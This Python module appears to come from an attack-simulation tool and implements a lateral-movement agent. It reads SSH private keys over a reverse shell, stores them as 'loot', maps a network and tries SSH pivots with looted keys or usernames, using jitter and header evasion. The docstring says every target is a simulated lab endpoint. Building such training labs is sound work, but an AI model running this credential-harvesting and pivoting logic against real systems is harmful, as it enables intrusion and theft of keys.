"""Lateral movement module.

Harvests SSH keys/credentials collected during the engagement and attempts
them against the lab's simulated internal network. All movement happens
against the fake internal hosts served by ``/api/lab/brutal/*`` — never real
network targets.
"""

import logging
from typing import Any

import httpx

from app.brutal_sessions import BrutalSession
from app.services.evasion import EvasionStrategy
from app.services.reverse_shell import ShellSession, run_command

logger = logging.getLogger("phantomscan.brutal_lateral")

SSH_KEY_PATHS = [
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.ssh/authorized_keys",
    "/home/backup/.ssh/id_rsa",
]


class LateralMovementAgent:
    """Moves from the compromised host to internal hosts using looted creds."""

    def __init__(self, session: BrutalSession, shell: ShellSession) -> None:
        self.session = session
        self.shell = shell
        self.base = self._base_url(session.target_url)
        self.evasion = EvasionStrategy()

    @staticmethod
    def _base_url(target_url: str) -> str:
        from urllib.parse import urlparse
        if "://" not in target_url:
            target_url = f"https://{target_url}"
        parsed = urlparse(target_url)
        return f"{parsed.scheme}://{parsed.netloc}"

    async def harvest_ssh_keys(self) -> dict[str, Any]:
        found: list[dict[str, Any]] = []
        for path in SSH_KEY_PATHS:
            result = await run_command(self.shell, f"cat {path}")
            if result.get("exit_code") == 0 and result.get("output"):
                found.append({"path": path, "preview": str(result["output"])[:80]})
                self.session.add_loot("ssh_key", path, str(result["output"]), "lateral_movement")
        await self.session.log_op(
            "ssh_keys_harvested",
            "success" if found else "failed",
            f"Harvested {len(found)} SSH private keys",
            output="\n".join(f["path"] for f in found),
        )
        return {"summary": f"Harvested {len(found)} SSH private keys", "keys": found}

    async def map_internal_network(self) -> dict[str, Any]:
        await self.evasion.jitter_delay()
        async with httpx.AsyncClient(headers=self.evasion.headers(), timeout=15.0) as client:
            response = await client.get(f"{self.base}/api/lab/brutal/network")
            response.raise_for_status()
            data = response.json()
        hosts = data.get("hosts", [])
        self.session.add_loot("network", "internal_network_map.json", str(hosts), "lateral_movement")
        await self.session.log_op(
            "network_mapped",
            "success",
            f"Mapped internal network — {len(hosts)} hosts discovered",
            output=str(hosts)[:3000],
        )
        return {"summary": f"Mapped internal network — {len(hosts)} hosts", "hosts": hosts}

    async def attempt_pivot(self, host: str, username: str, password: str = "", key: str = "") -> dict[str, Any]:
        payload: dict[str, Any] = {"host": host, "username": username}
        if key:
            payload["key"] = key
        if password:
            payload["password"] = password
        await self.evasion.jitter_delay()
        async with httpx.AsyncClient(headers=self.evasion.headers(), timeout=15.0) as client:
            response = await client.post(f"{self.base}/api/lab/brutal/ssh-login", json=payload)
            data = response.json()
        if data.get("authenticated"):
            await self.session.log_op(
                "pivot_succeeded",
                "success",
                f"Pivoted to {host} as {username} ({data.get('method', 'password')})",
            )
        else:
            await self.session.log_op("pivot_failed", "failed", f"Access denied on {host} for {username}")
        return {"host": host, **data}

    async def run(self) -> dict[str, Any]:
        """Full lateral movement flow: harvest keys → map network → pivot."""
        keys = await self.harvest_ssh_keys()
        network = await self.map_internal_network()

        loot = self.session.loot
        usernames: set[str] = set()
        for item in loot:
            if item["kind"] == "database":
                import json as _json
                try:
                    rows = _json.loads(item["content"])
                    for row in rows:
                        if isinstance(row, dict) and row.get("username"):
                            usernames.add(str(row["username"]))
                except Exception:
                    pass
        if keys.get("keys"):
            pivot = await self.attempt_pivot("10.0.0.2", "backup", key="-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----")
        else:
            pivot = {"host": "10.0.0.2", "authenticated": False, "error": "no credentials available"}
            if usernames:
                pivot = await self.attempt_pivot("10.0.0.2", next(iter(usernames)), password="demo-password")

        return {
            "summary": "Lateral movement complete",
            "keys": keys,
            "network": network,
            "pivot": pivot,
        }